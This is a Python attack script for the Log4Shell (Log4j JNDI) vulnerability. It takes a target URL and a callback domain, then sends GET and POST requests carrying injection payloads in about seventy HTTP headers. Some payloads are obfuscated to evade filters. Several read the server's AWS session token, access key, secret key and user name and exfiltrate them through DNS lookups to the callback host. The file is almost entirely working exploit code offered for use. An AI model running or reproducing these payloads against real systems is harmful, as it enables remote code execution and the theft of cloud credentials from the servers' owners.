#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import requests
import string
import random
import logging
logging.basicConfig(level=logging.DEBUG)
from requests.packages import urllib3
from urllib3 import disable_warnings
disable_warnings()
from requests_toolbelt.utils import dump
#coded_by_DorkerDevil
target = sys.argv[1]
ssrf = sys.argv[2]

S = 10
ran = ''.join(random.choices(string.ascii_uppercase + string.digits,
              k=S))
collab = str(ran) + '.' + ssrf
list = [
    'Referer',
'X-Api-Version',
'Accept-Charset',
'Accept-Datetime',
'Accept-Encoding',
'Accept-Language',
'Cookie',
'Forwarded',
'Forwarded-For',
'Forwarded-For-Ip',
'Forwarded-Proto',
'From',
'TE',
'True-Client-IP',
'Upgrade',
'User-Agent',
'Via',
'Warning',
'X-Api-Version',
'Max-Forwards',
'Origin',
'Pragma',
'DNT',
'Cache-Control',
'X-Att-Deviceid',
'X-ATT-DeviceId',
'X-Correlation-ID',
'X-Csrf-Token',
'X-CSRFToken',
'X-Do-Not-Track',
'X-Foo',
'X-Foo-Bar',
'X-Forwarded',
'X-Forwarded-By',
'X-Forwarded-For',
'X-Forwarded-For-Original',
'X-Forwarded-Host',
'X-Forwarded-Port',
'X-Forwarded-Proto',
'X-Forwarded-Protocol',
'X-Forwarded-Scheme',
'X-Forwarded-Server',
'X-Forwarded-Ssl',
'X-Forwarder-For',
'X-Forward-For',
'X-Forward-Proto',
'X-Frame-Options',
'X-From',
'X-Geoip-Country',
'X-Http-Destinationurl',
'X-Http-Host-Override',
'X-Http-Method',
'X-Http-Method-Override',
'X-HTTP-Method-Override',
'X-Http-Path-Override',
'X-Https',
'X-Htx-Agent',
'X-Hub-Signature',
'X-If-Unmodified-Since',
'X-Imbo-Test-Config',
'X-Insight',
'X-Ip',
'X-Ip-Trail',
'X-ProxyUser-Ip',
'X-Requested-With',
'X-Request-ID',
'X-UIDH',
'X-Wap-Profile',
'X-XSRF-TOKEN',
    ]
paload = \
    ['${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//:'
      + collab + '/a}', '${jndi:dns://' + collab
     + '/ext}${jndi:${lower:l}${lower:d}a${lower:p}://' + collab + '/',
     '${jndi:ldap://${env:user}.' + collab + '/a}', '${jndi:dns://'
     + collab
     + '/.${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}}'
     ,
     '${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.'
      + collab + '/a}', '${jndi:ldap://${sys:user.name}.'+collab+'}']
url = target + '/'

for headerz in list:
    for pay in paload:
        target_headerz = {headerz: pay}
        r = requests.get(url, headers=target_headerz, timeout=None,
                         verify=False, allow_redirects=True)
        data = dump.dump_all(r)
        print(data.decode('utf-8'))
        rpost = requests.post(url, data = pay, headers=target_headerz, timeout=None,
                         verify=False, allow_redirects=True)
        data = dump.dump_all(rpost)
        print(data.decode('utf-8'))